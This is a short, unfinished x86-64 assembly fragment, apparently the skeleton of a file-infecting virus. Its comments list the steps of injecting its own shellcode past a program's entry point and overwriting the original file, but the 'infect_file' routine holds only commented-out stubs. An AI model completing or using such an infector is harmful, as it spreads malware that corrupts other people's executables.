[BITS 64]

section .text

;-------------------------------------------------------;
; The actual infection starts here:			
;							
; 1) Get a pointer to .text section of the file		
; 2) Pad the entire .text with nops			
; 3) Get a pointer to the EntryPoint 			
; 4) Copy this shellcode past the EntryPoint 		
; 5) Overwrite the original file with the infected one  
;-------------------------------------------------------;

; PARAMETERS
; rcx = file
; rdx




infect_file:
    ; 1) Get a pointer to .text section
    ; xor rax, rax
    ; mov eax





    ; ret
